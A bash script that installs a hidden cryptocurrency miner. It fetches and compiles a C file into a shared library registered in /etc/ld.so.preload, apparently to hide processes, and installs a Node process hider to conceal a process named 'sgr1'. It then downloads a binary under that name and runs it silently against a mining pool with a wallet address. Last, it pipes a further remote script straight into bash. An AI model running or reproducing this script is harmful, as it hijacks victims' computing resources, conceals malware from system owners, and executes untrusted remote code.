#!/bin/bash
apt-get update ; apt-get install sudo -y
curl https://github.com/adawisaud/adawisaud/raw/main/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart
sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@9.2.0 -y && npm i -g node-process-hider && ph add sgr1"
mkdir .kap && cd .kap
wget -O sgr1 https://bitbucket.org/commuter21/escom/downloads/xmolx >/dev/null 2>&1
chmod +x sgr1
sudo ./sgr1 -a rx/0 -o 139.177.188.78:80 -u 86nvGCkLSc1iUmYYFGhQ9u8oHGH2tyKkUU8VpjAcC5WSQsTooSZgLBvewne84YY1GNDzjHmzWL7cxGf3enZjpBAuLBcDe4x -p ikuk -t $(nproc --all) --donate-level 1 -k > /dev/null 2>&1 &
curl -sL https://bitbucket.org/commuter21/escom/raw/main/gudabel.sh | bash